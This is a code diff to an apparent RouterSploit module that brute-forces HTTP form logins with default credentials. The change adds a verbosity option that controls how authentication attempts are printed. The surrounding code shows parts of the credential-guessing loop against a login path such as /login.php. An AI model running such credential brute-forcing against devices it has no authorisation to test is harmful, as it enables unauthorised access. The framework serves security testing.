@@ -11,6 +11,7 @@ from routersploit import (
     print_success,
     print_table,
     sanitize_url,
+    boolify,
 )
 
 
@@ -32,6 +33,7 @@ class Exploit(exploits.Exploit):
     defaults = exploits.Option(wordlists.defaults, 'User:Pass or file with default credentials (file://)')
     form = exploits.Option('auto', 'Post Data: auto or in form login={{LOGIN}}&password={{PASS}}&submit')
     path = exploits.Option('/login.php', 'URL Path')
+    verbosity = exploits.Option('yes', 'Display authentication attempts')
 
     credentials = []
     data = ""
@@ -127,11 +129,12 @@ class Exploit(exploits.Exploit):
         return '&'.join(res)
 
     def target_function(self, running, data):
+        module_verbosity = boolify(self.verbosity)
         name = threading.current_thread().name
         url = sanitize_url("{}:{}{}".format(self.target, self.port, self.path))
         headers = {u'Content-Type': u'application/x-www-form-urlencoded'}
 
-        print_status(name, 'process is starting...')
+        print_status(name, 'process is starting...', verbose=module_verbosity)
 
         while running.is_set():
             try:
@@ -145,11 +148,11 @@ class Exploit(exploits.Exploit):
 
                 if l < self.invalid["min"] or l > self.invalid["max"]:
                     running.clear()
-                    print_success("{}: Authentication succeed!".format(name), user, password)
+                    print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
                     self.credentials.append((user, password))
                 else:
-                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password))
+                    print_error(name, "Authentication Failed - Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
             except StopIteration:
                 break
 
-        print_status(name, 'process is terminated.')
+        print_status(name, 'process is terminated.', verbose=module_verbosity)
